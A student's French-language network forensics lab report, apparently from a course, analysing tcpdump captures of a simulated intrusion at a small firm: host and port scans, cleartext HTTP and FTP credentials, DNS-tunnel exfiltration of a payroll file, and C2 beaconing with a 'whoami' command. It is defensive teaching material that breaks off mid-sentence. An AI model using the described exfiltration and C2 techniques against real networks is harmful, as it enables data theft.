@@ -1,0 +1,690 @@
+==============================================================================
+420-B01-HU — Surveillance préventive en cybersécurité
+Lab — Analyse de trafic avec tcpdump (Ébénisterie Gatineau)
+Étudiant : Rick De La Roche Souvestre — 2195254
+==============================================================================
+
+
+==============================================================================
+PARTIE A — PRISE EN MAIN EN DIRECT
+==============================================================================
+
+------------------------------------------------------------------------------
+A1. Interfaces disponibles
+------------------------------------------------------------------------------
+Commandes :
+  ip -br a
+  sudo tcpdump -D
+
+Résultat :
+  lo     UNKNOWN   127.0.0.1/8 ::1/128
+  eth0   UP        10.0.0.2/24 fe80::aff:fe00:2/64
+  tcpdump -D : 1.eth0 [Up, Running, Connected], 2.any, 3.lo, 4.bluetooth-monitor,
+               5.nflog, 6.nfqueue, 7.dbus-system, 8.dbus-session
+
+Réponse :
+  L'interface qui mène au réseau est eth0 (état UP, adresse 10.0.0.2/24).
+  lo est l'interface de bouclage (127.0.0.1) et ne sort pas du poste. Les autres
+  interfaces listées par tcpdump (any, bluetooth-monitor, nflog, nfqueue, dbus-*)
+  sont des pseudo-interfaces ou des interfaces système, pas le réseau.
+
+------------------------------------------------------------------------------
+A2. Capture de 10 paquets avec et sans -n
+------------------------------------------------------------------------------
+Commandes :
+  sudo tcpdump -i eth0 -n -c 10
+  sudo tcpdump -i eth0 -c 10
+  (trafic généré dans un 2e terminal : ping 8.8.8.8)
+
+Réponse :
+  Avec -n, les 10 paquets capturés sont uniquement le trafic ICMP du ping
+  (5 paires echo request/reply entre 10.0.0.2 et 8.8.8.8), avec les adresses
+  IP brutes.
+
+  Sans -n, tcpdump effectue des résolutions DNS inverses (requêtes PTR) vers le
+  serveur DNS (10.0.0.1) :
+   - les adresses IP sont remplacées par des noms d'hôte
+     (8.8.8.8 -> dns.google, 10.0.0.1 -> pfSense.home.arpa) ;
+   - les ports sont remplacés par des noms de service (53 -> domain) ;
+   - une adresse sans enregistrement PTR reste affichée en IP
+     (10.0.0.2 -> réponse NXDomain).
+
+  Conséquences : tcpdump génère lui-même du trafic qui pollue la capture :
+  6 des 10 paquets sont ses propres requêtes PTR, contre seulement 4 paquets
+  ICMP. L'affichage est aussi ralenti (environ 0,84 s d'attente pour une
+  réponse PTR). En analyse, on utilise donc -n pour obtenir des valeurs brutes
+  et fiables, sans trafic parasite.
+
+------------------------------------------------------------------------------
+A3. DNS et HTTP pendant un curl
+------------------------------------------------------------------------------
+Commandes :
+  sudo tcpdump -i eth0 -n -l 'port 53 or port 80'
+  sudo tcpdump -i eth0 -n -l -A 'port 53 or port 80'
+  (dans un 2e terminal : curl -s http://example.com > /dev/null)
+
+Réponse :
+  Requête DNS : le poste 10.0.0.2 interroge le serveur DNS 10.0.0.1 (port 53)
+  avec deux requêtes pour example.com : A? (IPv4) et AAAA? (IPv6).
+
+  Adresses retournées :
+   - A    : 172.66.147.243 et 104.20.23.154
+   - AAAA : 2606:4700:10::6814:179a et 2606:4700:10::ac42:93f3
+
+  curl se connecte ensuite en TCP au port 80 de l'une de ces adresses
+  (poignée de main SYN, SYN-ACK, ACK).
+
+  Avec -A, la requête HTTP est lisible en clair :
+   - GET / HTTP/1.1
+   - Host: example.com
+   - User-Agent: curl/8.22.0
+  La réponse du serveur (HTTP/1.1 200 OK) et le contenu de la page
+  (<title>Example Domain</title>) sont aussi lisibles.
+
+  Remarque : l'option -l (sortie ligne par ligne) est nécessaire avec | tee.
+  Sans elle, tcpdump garde sa sortie en mémoire tampon et le fichier reste vide
+  après un Ctrl+C.
+
+------------------------------------------------------------------------------
+A4. Même chose en HTTPS
+------------------------------------------------------------------------------
+Commandes :
+  sudo tcpdump -i eth0 -n -l -A 'port 53 or port 443'
+  (dans un 2e terminal : curl -s https://example.com > /dev/null)
+
+Observations :
+  - La requête DNS est identique et toujours en clair :
+    example.com -> 172.66.147.243 et 104.20.23.154.
+  - La connexion TCP se fait sur le port 443 de 172.66.147.243.
+  - Avec -A, on ne retrouve ni la ligne GET, ni Host:, ni User-Agent:, ni la
+    réponse du serveur : la charge utile est illisible.
+  - Seul le premier message du client (Client Hello TLS) laisse apparaître en
+    clair le nom example.com (SNI) et les protocoles proposés h2 / http/1.1
+    (ALPN).
+
+Pourquoi :
+  Avec HTTPS, la communication HTTP est chiffrée par TLS après la négociation.
+  tcpdump voit encore les en-têtes IP et TCP (adresses, ports, drapeaux,
+  tailles) ainsi que certaines métadonnées de la négociation TLS (SNI, ALPN),
+  mais plus le contenu de la requête ni de la réponse. Avec HTTP (A3), tout
+  circulait en clair, y compris le corps de la page.
+
+Conséquence pour un analyste :
+  Même sans pouvoir lire le trafic HTTPS, on peut encore identifier le domaine
+  visité grâce au DNS et au SNI, l'adresse IP, le port, l'heure et le volume
+  échangé.
+
+------------------------------------------------------------------------------
+A5. Enregistrer 30 secondes puis relire
+------------------------------------------------------------------------------
+Commandes :
+  sudo timeout 30 tcpdump -i eth0 -n -w ma_capture.pcap
+  tcpdump -n -r ma_capture.pcap | head
+  tcpdump -n -r ma_capture.pcap | wc -l
+
+Résultat :
+  La capture de 30 secondes contient 63 paquets : requêtes DNS pour
+  example.com, connexions HTTP (port 80) et HTTPS (port 443) vers
+  104.20.23.154 / 172.66.147.243, et échanges ICMP du ping vers 8.8.8.8.
+
+Observations :
+  - Pendant l'enregistrement avec -w, rien ne s'affiche : tcpdump écrit les
+    paquets bruts dans le fichier au format binaire pcap au lieu de les
+    afficher. Le fichier ne se lit donc pas avec cat, mais avec tcpdump -r.
+  - timeout 30 arrête la capture automatiquement après 30 secondes.
+  - La lecture avec -r n'exige pas sudo, car elle ne touche pas à l'interface
+    réseau : elle lit simplement un fichier.
+  - Le message « Broken pipe » est normal : head ferme le tube après 10 lignes
+    alors que tcpdump a encore des paquets à afficher.
+
+Intérêt :
+  Une capture enregistrée peut être relue autant de fois que nécessaire, avec
+  des filtres différents, sans recapturer, et conservée comme preuve.
+
+
+==============================================================================
+PARTIE B — L'ENQUÊTE (Ebenisterie_Gatineau.pcap)
+==============================================================================
+
+------------------------------------------------------------------------------
+B1. Vue d'ensemble
+------------------------------------------------------------------------------
+Q1 — Nombre de paquets
+  Commande :
+    tcpdump -nr Ebenisterie_Gatineau.pcap | wc -l
+  Réponse :
+    La capture contient 440 paquets.
+
+Q2 — Début et fin de la capture
+  Commandes :
+    tcpdump -nr Ebenisterie_Gatineau.pcap -tttt | head -1
+    tcpdump -nr Ebenisterie_Gatineau.pcap -tttt | tail -1
+  Réponse :
+    - Début : 2026-10-13 10:00:00.000000 (requête DNS de POSTE-COMPTA,
+      192.168.50.21, pour outlook.office365.com)
+    - Fin   : 2026-10-13 10:04:28.503764 (fin d'une session HTTPS entre
+      POSTE-RH, 192.168.50.22, et 52.96.88.130)
+    - Durée : environ 4 min 28 s, ce qui concorde avec la capture « de
+      quelques minutes vers 10 h » mentionnée par le technicien.
+
+Q3 — Adresse IP source la plus active
+  Commande :
+    tcpdump -nr Ebenisterie_Gatineau.pcap ip | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head
+  (awk '{print $3}' extrait l'adresse source avec son port, cut -d. -f1-4
+   retire le port pour ne garder que l'IP, puis sort | uniq -c | sort -rn
+   compte et trie par nombre de paquets.)
+
+  Résultat :
+    136 192.168.50.35   (POSTE-ATELIER)
+     64 192.168.50.22   (POSTE-RH)
+     62 192.168.50.21   (POSTE-COMPTA)
+     36 192.168.50.20   (SRV-FICHIERS)
+     32 198.51.100.66   (externe, inconnue)
+     27 192.168.50.10   (SRV-DC01)
+     24 52.96.88.130    (Office 365)
+     18 142.250.80.4
+     12 52.113.194.132
+     12 205.236.11.20
+
+  Réponse :
+    L'adresse 192.168.50.35 (POSTE-ATELIER) émet le plus de paquets :
+    136 sur 440, soit environ 31 % du trafic, plus du double du poste suivant
+    (POSTE-RH, 64).
+
+  Est-ce normal ?
+    Non. Un poste partagé d'atelier sert surtout à des tâches légères et
+    devrait être parmi les moins actifs du réseau. Il émet pourtant plus que
+    les serveurs (SRV-FICHIERS : 36, SRV-DC01 : 27). Ce volume anormal concorde
+    avec la plainte du client (le poste « rame ») et laisse soupçonner une
+    compromission. On note aussi une adresse externe inconnue, 198.51.100.66
+    (32 paquets), à surveiller.
+
+------------------------------------------------------------------------------
+B2. Le DNS raconte l'histoire
+------------------------------------------------------------------------------
+Q4 — Noms de domaine demandés au DNS
+  Commande :
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'udp dst port 53' | awk '{print $8}' | sort | uniq -c | sort -rn
+  (le 8e champ d'une requête DNS est le nom demandé :
+   heure IP src > dst: id+ A? nom.)
+
+  Résultat (22 requêtes) :
+    4 outlook.office365.com.
+    3 www.desjardins.com.
+    2 www.revenuquebec.ca.
+    2 www.google.ca.
+    2 teams.microsoft.com.
+    1 intranet.ebenisterie-gatineau.local.
+    1 ctldl.windowsupdate.com.
+    1 cdn-maj-update.net.
+    1 3-jnkqzx2.cdn-maj-update.net.
+    1 2-s3bnobqwsz.cdn-maj-update.net.
+    1 1-xhgllfpbtg.cdn-maj-update.net.
+    1 0-izgecr33mr.cdn-maj-update.net.
+
+  Analyse :
+    La plupart des domaines correspondent à des services légitimes d'une PME :
+    Microsoft 365 (outlook, teams), Windows Update (ctldl.windowsupdate.com),
+    banque (desjardins), impôts (revenuquebec), Google, et l'intranet interne
+    (intranet.ebenisterie-gatineau.local).
+    Le domaine cdn-maj-update.net ne correspond à aucun service connu. Son nom
+    imite un réseau de distribution de « mises à jour » pour paraître
+    légitime, et il est accompagné de sous-domaines numérotés 0- à 3- aux
+    noms aléatoires, typiques d'une exfiltration par DNS (voir Q10).
+
+Q5 — Domaine suspect : poste demandeur et adresse IP
+  Commandes :
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'port 53' | grep 'cdn-maj-update'
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src port 53 and dst host 192.168.50.35'
+  (sans -v, tcpdump ne répète pas le nom de domaine dans les réponses DNS ;
+   on les associe aux requêtes grâce à l'identifiant de transaction,
+   ex. 26680+ dans la requête -> 26680 dans la réponse.)
+
+  Résultat :
+    Requêtes (192.168.50.35 -> 192.168.50.10:53) :
+      10:00:41.280 id 34718  A? 0-izgecr33mr.cdn-maj-update.net.
+      10:00:42.980 id 35997  A? 1-xhgllfpbtg.cdn-maj-update.net.
+      10:00:44.680 id 33312  A? 2-s3bnobqwsz.cdn-maj-update.net.
+      10:00:46.380 id 19234  A? 3-jnkqzx2.cdn-maj-update.net.
+      10:00:51.080 id 26680  A? cdn-maj-update.net.
+    Réponses (192.168.50.10:53 -> 192.168.50.35) :
+      34718, 35997, 33312, 19234, 26680 : 1/0/0 A 198.51.100.66
+
+  Réponse :
+    - Domaine suspect : cdn-maj-update.net
+    - Poste qui l'interroge : 192.168.50.35 (POSTE-ATELIER), uniquement lui.
+    - Adresse IP retournée : 198.51.100.66, pour le domaine principal comme
+      pour tous ses sous-domaines numérotés.
+
+  Analyse :
+    198.51.100.66 est l'adresse externe inconnue déjà repérée en Q3
+    (32 paquets). Le poste de l'atelier résout donc le domaine malveillant
+    puis communique avec ce serveur externe : c'est le serveur de
+    l'attaquant (commande-contrôle, voir Q11).
+    Les quatre sous-domaines numérotés sont demandés à intervalle régulier
+    d'environ 1,7 s (10:00:41 -> 42 -> 44 -> 46), ce qui indique un
+    comportement automatisé et non une action humaine.
+
+
+------------------------------------------------------------------------------
+B3. Reconnaissance
+------------------------------------------------------------------------------
+Q6 — Balayage ICMP (ping sweep)
+  Commandes :
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'icmp[icmptype] == icmp-echo'
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'icmp[icmptype] == icmp-echo' | wc -l
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'icmp[icmptype] == icmp-echoreply'
+  (icmp[icmptype] lit l'octet « type » de l'en-tête ICMP :
+   type 8 = icmp-echo (requête), type 0 = icmp-echoreply (réponse).)
+
+  Quel poste ?
+    192.168.50.35 (POSTE-ATELIER).
+
+  Combien de requêtes ?
+    30 requêtes ICMP echo, de 192.168.50.1 à 192.168.50.30, dans l'ordre.
+
+  Quels hôtes répondent ?
+    5 hôtes répondent :
+      192.168.50.1   Passerelle / pare-feu   (seq 1)
+      192.168.50.10  SRV-DC01                (seq 10)
+      192.168.50.20  SRV-FICHIERS            (seq 20)
+      192.168.50.21  POSTE-COMPTA            (seq 21)
+      192.168.50.22  POSTE-RH                (seq 22)
+    Les 25 autres adresses de la plage ne répondent pas (aucun hôte).
+    192.168.50.35 n'apparaît pas : c'est le poste qui effectue le balayage,
+    et il ne fait pas partie de la plage balayée (.1 à .30).
+
+  Indices d'un outil automatisé :
+    - 30 requêtes en 0,58 s (10:00:22.566 -> 10:00:23.146), une toutes les
+      20 ms exactement ;
+    - même identifiant ICMP (id 19229) pour toutes les requêtes et numéro de
+      séquence égal au dernier octet de l'adresse visée (seq N -> .N) :
+      un seul programme, une seule boucle ;
+    - length 8 : en-tête ICMP seul, sans données. Un ping normal envoie
+      32 ou 56 octets de données ; une requête minimale est la signature
+      d'un outil de balayage (ex. nmap, hping) ou d'un script.
+
+  Conclusion :
+    En moins d'une seconde, le poste de l'atelier a cartographié le réseau
+    et identifié 5 hôtes actifs, dont les deux serveurs (.10 et .20).
+    C'est la phase de reconnaissance qui précède l'attaque.
+
+Q7 — Balayage de ports (SYN scan) sur un serveur
+  Commandes :
+    # SYN envoyés par le poste de l'atelier
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src host 192.168.50.35 and tcp[tcpflags] == tcp-syn'
+    # Nombre de ports testés
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src host 192.168.50.35 and dst host 192.168.50.20 and src port 61337 and tcp[tcpflags] == tcp-syn' | wc -l
+    # Ports ouverts (SYN-ACK du serveur)
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src host 192.168.50.20 and dst host 192.168.50.35 and dst port 61337 and tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)'
+    # Ports fermés (RST du serveur)
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src host 192.168.50.20 and dst port 61337 and tcp[tcpflags] & tcp-rst != 0' | wc -l
+    # RST envoyés par l'attaquant après chaque SYN-ACK
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src host 192.168.50.35 and dst host 192.168.50.20 and src port 61337 and tcp[tcpflags] & tcp-rst != 0'
+
+  Quel serveur ?
+    192.168.50.20 (SRV-FICHIERS).
+
+  Quel type de balayage ?
+    Un balayage SYN (« half-open » / furtif, équivalent de nmap -sS).
+    Indices dans les drapeaux TCP et les en-têtes :
+      - le poste envoie uniquement des SYN ([S]) et ne termine jamais la
+        poignée de main ;
+      - port source fixe (61337) pour toutes les sondes et fenêtre
+        win 1024 : signature d'un outil qui fabrique ses propres paquets
+        (nmap). Les connexions normales du système utilisent win 64240 et
+        un nouveau port source à chaque fois ;
+      - ports testés dans un ordre aléatoire (comportement par défaut de
+        nmap) ;
+      - 18 sondes en 51 ms (10:00:27.166 -> 10:00:27.217), une toutes les
+        3 ms : outil automatisé.
+
+  Combien de ports sont testés ?
+    18 ports : 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993,
+    1433, 3306, 3389, 5900, 8080.
+
+  Quels ports sont ouverts ?
+    5 ports répondent par un SYN-ACK ([S.]) :
+      21   FTP       (identifiants en clair, voir Q9)
+      22   SSH       (administration à distance)
+      139  NetBIOS   (partage de fichiers Windows, ancien)
+      445  SMB       (partage de fichiers Windows)
+      3389 RDP       (bureau à distance Windows)
+    Les 13 autres ports répondent par un RST ([R.]) : ils sont fermés.
+    Justification : le filtre BPF
+      tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)
+    ne garde que les paquets où les bits SYN et ACK sont tous deux à 1
+    (réponse d'un port ouvert), envoyés par 192.168.50.20 vers le port
+    source du balayage (61337). Le filtre
+      tcp[tcpflags] & tcp-rst != 0
+    compte les RST (ports fermés) : 13, et 5 + 13 = 18.
+    La fenêtre win 8192 des réponses est typique d'un serveur Windows.
+
+  Pourquoi un RST juste après chaque SYN-ACK ?
+    Les 5 RST de l'attaquant sont envoyés environ 0,4 ms après chaque
+    SYN-ACK (ex. port 21 : SYN-ACK 10:00:27.172589 -> RST 10:00:27.172989),
+    avec un numéro de séquence égal à l'ACK reçu, pour que le serveur
+    l'accepte.
+    Le SYN-ACK suffit à savoir que le port est ouvert : l'attaquant coupe
+    immédiatement au lieu d'envoyer l'ACK final (balayage « half-open ») :
+      - discrétion : la connexion n'est jamais établie, donc l'application
+        derrière le port (FTP, RDP, SMB...) n'est pas avertie et ne
+        journalise souvent rien ; seule une sonde réseau (IDS, capture) le
+        voit ;
+      - rapidité : un paquet aller et un retour par port ;
+      - pas de connexions à moitié ouvertes laissées sur le serveur, qui
+        pourraient le ralentir ou déclencher une alerte.
+    De plus, comme nmap fabrique ses propres paquets, le système de
+    l'attaquant ne connaît pas cette connexion et répond lui-même par un
+    RST au SYN-ACK inattendu.
+
+  Conclusion :
+    Après avoir découvert les hôtes actifs (Q6), le poste de l'atelier a
+    ciblé le serveur de fichiers et identifié ses services exposés, dont
+    plusieurs très recherchés par les attaquants (SMB, RDP, FTP en clair).
+
+
+------------------------------------------------------------------------------
+B4. Identifiants en clair
+------------------------------------------------------------------------------
+Q8 — Identifiants de l'intranet
+  Commandes :
+    # Trafic HTTP de la capture (qui parle à qui, quelles méthodes)
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'tcp port 80'
+    # Contenu de l'échange entre POSTE-RH et l'intranet
+    tcpdump -nr Ebenisterie_Gatineau.pcap -A 'host 192.168.50.22 and host 192.168.50.10 and tcp port 80'
+
+  Déroulement (POSTE-RH 192.168.50.22 -> SRV-DC01 192.168.50.10:80) :
+    10:00:17.466  GET /connexion.php               (ouverture de la page)
+    10:00:17.486  HTTP/1.1 200 OK                  (formulaire : champs
+                                                    utilisateur, motdepasse)
+    10:00:17.506  POST /connexion.php              (envoi du formulaire)
+                  Host: intranet.ebenisterie-gatineau.local
+                  Content-Type: application/x-www-form-urlencoded
+                  utilisateur=mlavoie&motdepasse=Erable2026%21&valider=Connexion
+    10:00:17.526  HTTP/1.1 302 Found
+                  Location: /accueil.php
+                  Set-Cookie: PHPSESSID=7f3a9c21be; HttpOnly
+
+  Réponse :
+    - Nom d'utilisateur : mlavoie
+    - Mot de passe      : Erable2026!
+
+  Encodage URL :
+    Dans un formulaire, les caractères spéciaux sont encodés en %XX, où XX
+    est le code ASCII en hexadécimal. %21 = 0x21 = 33 = « ! ».
+    Vérification : printf '\x21\n'
+                   python3 -c "import urllib.parse; print(urllib.parse.unquote('Erable2026%21'))"
+
+  Analyse :
+    - La réponse 302 avec Location: /accueil.php indique que la connexion a
+      réussi : le mot de passe est valide.
+    - Le cookie de session PHPSESSID=7f3a9c21be circule aussi en clair :
+      quiconque le capture peut détourner la session sans connaître le mot
+      de passe.
+    - Cause : l'intranet utilise HTTP (port 80) et non HTTPS. Tout ce qui
+      est envoyé (identifiants, cookie, pages) est lisible sur le réseau,
+      notamment par le poste compromis de l'atelier.
+    - Les autres échanges HTTP de la capture sont normaux (mise à jour des
+      certificats Windows par POSTE-COMPTA vers 93.184.215.201) ou font
+      partie du balayage de ports (SYN vers 192.168.50.20:80 -> RST).
+
+Q9 — Connexion FTP du poste de l'atelier au serveur de fichiers
+  Commandes :
+    # Canal de contrôle (tcpdump affiche les commandes FTP en fin de ligne)
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'tcp port 21'
+    # Canal de données (port calculé à partir de la réponse 227)
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'tcp port 50001'
+
+  Déroulement (POSTE-ATELIER 192.168.50.35 -> SRV-FICHIERS 192.168.50.20:21) :
+    10:00:33.250  220 SRV-FICHIERS FTP pret
+    10:00:33.270  USER sauvegarde
+    10:00:33.290  331 Mot de passe requis pour sauvegarde
+    10:00:33.310  PASS Bkp!Atelier99
+    10:00:33.330  230 Utilisateur connecte          (connexion réussie)
+    10:00:33.350  PASV
+    10:00:33.370  227 Entering Passive Mode (192,168,50,20,195,81)
+    10:00:33.390  RETR paie_2026_T3.xlsx
+    10:00:33.410  150 Ouverture de la connexion de donnees
+    10:00:33.430  226 Transfert termine
+    10:00:33.450  QUIT
+    10:00:33.470  221 Au revoir
+
+  Quel compte et quel mot de passe ?
+    - Compte       : sauvegarde
+    - Mot de passe : Bkp!Atelier99
+    FTP transmet les commandes, dont USER et PASS, en clair. La réponse
+    230 confirme que les identifiants sont valides.
+    Il s'agit d'un compte de service de sauvegarde, qui a généralement
+    accès en lecture à l'ensemble des fichiers du serveur : un compte très
+    précieux pour un attaquant.
+
+  Quel fichier est téléchargé ? Pourquoi est-ce inquiétant ?
+    Le fichier paie_2026_T3.xlsx (paie du 3e trimestre 2026), via RETR.
+    Un fichier de paie contient des renseignements personnels et
+    confidentiels sur tous les employés : noms, salaires, NAS, coordonnées
+    bancaires pour le dépôt direct. Risques : vol d'identité, fraude
+    bancaire, extorsion, atteinte à la réputation de l'entreprise.
+    Au Québec, la Loi 25 oblige à déclarer un incident de confidentialité
+    impliquant des renseignements personnels à la Commission d'accès à
+    l'information (CAI) et à aviser les personnes concernées lorsqu'il
+    présente un risque de préjudice sérieux.
+    De plus, la connexion FTP a lieu 6 secondes après la découverte du
+    port 21 ouvert par le balayage (10:00:27 -> 10:00:33) : l'attaquant
+    connaissait déjà les identifiants et agit de façon automatisée.
+
+  Sur quel port passe le canal de données ? (calcul)
+    Réponse du serveur : 227 Entering Passive Mode (192,168,50,20,195,81)
+    Format (h1,h2,h3,h4,p1,p2) :
+      - IP   = 192.168.50.20
+      - port = p1 x 256 + p2 = 195 x 256 + 81 = 49 920 + 81 = 50 001
+    (le port est un nombre de 16 bits découpé en deux octets : p1 est
+     l'octet de poids fort, p2 l'octet de poids faible)
+    Vérification avec tcpdump -nr Ebenisterie_Gatineau.pcap 'tcp port 50001' :
+    le poste 192.168.50.35:52101 ouvre une connexion vers
+    192.168.50.20:50001, le serveur envoie 904 octets ([P.] length 904)
+    puis la connexion est fermée (FIN/ACK).
+
+  Remarque :
+    Dans cette capture, le canal de données s'ouvre à 10:00:33.210, avant
+    même la connexion de contrôle (33.220) et la réponse 227 (33.370). Dans
+    un échange FTP réel, c'est impossible : le client ne connaît le port
+    50001 qu'après la réponse 227. Il s'agit d'un artefact de la capture
+    simulée ; l'analyse reste la même.
+
+
+
+------------------------------------------------------------------------------
+B5. Exfiltration et commande-contrôle
+------------------------------------------------------------------------------
+Q10 — Exfiltration par DNS (sous-domaines numérotés)
+  Commandes :
+    # 1. Extraire les morceaux, dans l'ordre
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'udp dst port 53' | awk '{print $8}' | grep -E '^[0-9]+-' | sort -n | cut -d. -f1 | cut -d- -f2
+    # 2. Les coller en une seule chaîne (et compter les caractères)
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'udp dst port 53' | awk '{print $8}' | grep -E '^[0-9]+-' | sort -n | cut -d. -f1 | cut -d- -f2 | tr -d '\n'; echo
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'udp dst port 53' | awk '{print $8}' | grep -E '^[0-9]+-' | sort -n | cut -d. -f1 | cut -d- -f2 | tr -d '\n' | wc -c
+    # 3. Décoder
+    echo izgecr33mrxhgllfpbtgs3bnobqwszjnkqzx2 | tr a-z A-Z | base32 -d; echo
+
+  Explication de la chaîne de commandes :
+    - awk '{print $8}'      : extrait le nom de domaine demandé
+    - grep -E '^[0-9]+-'    : garde les noms qui commencent par un numéro
+                              suivi d'un tiret (0-, 1-, 2-...)
+    - sort -n               : tri numérique selon ce numéro (0, 1, 2, 3)
+    - cut -d. -f1           : garde la partie avant le premier point
+                              (ex. 2-s3bnobqwsz)
+    - cut -d- -f2           : garde la partie après le tiret (ex. s3bnobqwsz)
+    - tr -d '\n'            : supprime les retours à la ligne pour coller
+                              les morceaux
+    - tr a-z A-Z            : met en majuscules (alphabet base32 : A-Z, 2-7)
+    - base32 -d             : décode
+
+  Morceaux dans l'ordre :
+    0 -> izgecr33mr
+    1 -> xhgllfpbtg
+    2 -> s3bnobqwsz
+    3 -> jnkqzx2
+
+  Chaîne reconstituée (37 caractères) :
+    izgecr33mrxhgllfpbtgs3bnobqwszjnkqzx2
+
+  Drapeau obtenu :
+    FLAG{dns-exfil-paie-T3}
+
+  Remarque sur le bourrage (=) :
+    Le base32 encode les données par blocs de 8 caractères. 37 n'est pas un
+    multiple de 8 : il manque normalement 3 caractères de bourrage « = »
+    (37 + 3 = 40). La version de base32 de la VM Kali a décodé la chaîne
+    sans bourrage ; sur d'autres versions, le décodage s'arrête avec
+    « base32: invalid input ». Dans ce cas, on ajoute le bourrage :
+      echo "izgecr33mrxhgllfpbtgs3bnobqwszjnkqzx2===" | tr a-z A-Z | base32 -d
+
+  Analyse :
+    Le poste de l'atelier (192.168.50.35) découpe des données encodées en
+    base32 en petits morceaux et les place dans des sous-domaines numérotés
+    de cdn-maj-update.net (tunnel DNS). Le serveur DNS interne (SRV-DC01)
+    ne connaît pas ces noms et relaie les requêtes vers le serveur DNS de
+    l'attaquant, qui reçoit les morceaux et les réassemble. Les données
+    sortent donc du réseau par le DNS, presque toujours autorisé par le
+    pare-feu.
+    On utilise le base32 et non le base64 parce que les noms DNS ne
+    distinguent pas majuscules et minuscules et n'acceptent que lettres,
+    chiffres et tirets.
+    Le drapeau « dns-exfil-paie-T3 » confirme le lien avec le fichier
+    paie_2026_T3.xlsx téléchargé par FTP (Q9) : téléchargement à
+    10:00:33, exfiltration par DNS de 10:00:41 à 10:00:46, soit environ
+    8 secondes plus tard.
+
+Q11 — Commande-contrôle (C2) et balisage
+  Commandes :
+    # Tentatives de connexion (SYN) vers le serveur externe
+    tcpdump -nr Ebenisterie_Gatineau.pcap -tttt 'host 198.51.100.66 and tcp[tcpflags] == tcp-syn'
+    # Requêtes HTTP du poste (paquets avec données, drapeau PSH)
+    tcpdump -nr Ebenisterie_Gatineau.pcap -A 'src host 192.168.50.35 and dst host 198.51.100.66 and tcp[tcpflags] & tcp-push != 0'
+    # Réponses du serveur : comparaison des tailles
+    tcpdump -nr Ebenisterie_Gatineau.pcap 'src host 198.51.100.66 and tcp[tcpflags] & tcp-push != 0'
+    # Contenu d'une réponse normale (n=4) et de la réponse différente (n=5)
+    tcpdump -nr Ebenisterie_Gatineau.pcap -A 'src host 198.51.100.66 and (dst port 53004 or dst port 53005) and tcp[tcpflags] & tcp-push != 0'
+
+  Adresse IP et port :
+    198.51.100.66, port TCP 8080 (adresse de cdn-maj-update.net, Q5).
+    Le port 8080 est un port HTTP « alternatif » (proxys, serveurs de
+    développement, consoles d'administration) : un poste de travail n'a
+    aucune raison normale de joindre un serveur Internet sur ce port. Il
+    est apprécié des attaquants parce qu'il ressemble à du trafic web et
+    est souvent ouvert en sortie.
+
+  Intervalle des connexions :
+    8 connexions (SYN) de 10:00:51 à 10:04:20 :
+      10:00:51.130 -> 10:01:21.280  30,150 s
+      10:01:21.280 -> 10:01:51.662  30,382 s
+      10:01:51.662 -> 10:02:21.372  29,711 s
+      10:02:21.372 -> 10:02:51.126  29,753 s
+      10:02:51.126 -> 10:03:20.846  29,720 s
+      10:03:20.846 -> 10:03:50.499  29,653 s
+      10:03:50.499 -> 10:04:20.234  29,735 s
+    Soit environ toutes les 30 secondes, avec une petite variation de
+    +/- 0,4 s (« jitter ») ajoutée volontairement par le logiciel
+    malveillant pour éviter les outils qui détectent des intervalles
+    parfaitement identiques.
+    Les ports sources se suivent (53000, 53001 ... 53007) : un même
+    programme qui ouvre une nouvelle connexion à chaque tour de boucle.
+
+  Nom de ce comportement :
+    Le « beaconing » (balisage) : le logiciel malveillant contacte
+    régulièrement son serveur de commande-contrôle pour signaler qu'il est
+    actif et demander s'il a des ordres à exécuter.
+
+  Requêtes envoyées par le poste :
+    GET /maj/check?id=ATELIER-35&n=0 HTTP/1.1   (n = 0 à 7)
+    Host: cdn-maj-update.net:8080
+    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+    - id=ATELIER-35 : identifiant de la victime auprès du serveur C2 ;
+    - n=0 à 7       : compteur incrémenté à chaque balise ;
+    - /maj/check    : imite une vérification de mises à jour.
+
+  User-Agent et ce qu'il a de suspect :
+    Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+    = Internet Explorer 6 (2001) sous Windows XP (NT 5.1, plus pris en
+    charge depuis avril 2014).
+    - aucun poste en 2026 n'utilise IE6 sous XP ; les autres postes du
+      réseau utilisent des navigateurs modernes (ex. POSTE-RH en Q8 :
+      Mozilla/5.0 (Windows NT 10.0; Win64; x64)) ;
+    - la chaîne est identique dans les 8 requêtes : elle est codée en dur
+      dans le logiciel malveillant, ce n'est pas un vrai navigateur ;
+    - un vrai navigateur ne ferait pas une requête automatique toutes les
+      30 s vers /maj/check.
+    Cette chaîne est un indicateur de compromission (IOC) : une règle
+    d'alerte ou de blocage sur « MSIE 6.0 » la détecterait.
+
+  La réponse qui diffère :
+    7 réponses du serveur font 42 octets ; celle de 10:03:20.896 (réponse
+    à la balise n=5, port 53005) fait 48 octets.
+    - Réponse normale  : HTTP/1.1 200 OK ... corps : NOOP
+      (« No Operation » : rien à faire)
+    - Réponse différente : HTTP/1.1 200 OK ... corps : CMD:whoami
+    Le serveur C2 ordonne au poste d'exécuter la commande whoami, qui
+    affiche le nom du compte sous lequel le logiciel malveillant
+    s'exécute. C'est une commande classique de reconnaissance après
+    compromission : l'attaquant vérifie ses privilèges (simple
+    utilisateur ou administrateur) avant de choisir la suite de
+    l'attaque. Elle indique aussi qu'un opérateur humain pilote
